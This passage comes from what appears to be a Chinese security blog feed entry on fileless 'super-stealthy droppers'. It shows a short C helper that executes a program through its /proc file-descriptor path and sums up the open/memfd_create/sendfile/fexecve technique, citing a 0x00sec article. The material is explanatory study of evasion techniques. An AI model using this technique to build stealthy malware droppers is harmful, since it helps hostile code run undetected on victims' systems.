<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
<li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
<li>这篇文章中作者是以打开xeye程序为示例，还有其它猥琐的利用场景吗？<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;几周之前我看了这篇&lt;a href=&quot;https://blog.gdssecurity.com/la
    
    </summary>
    
    
  </entry>
  
</feed>
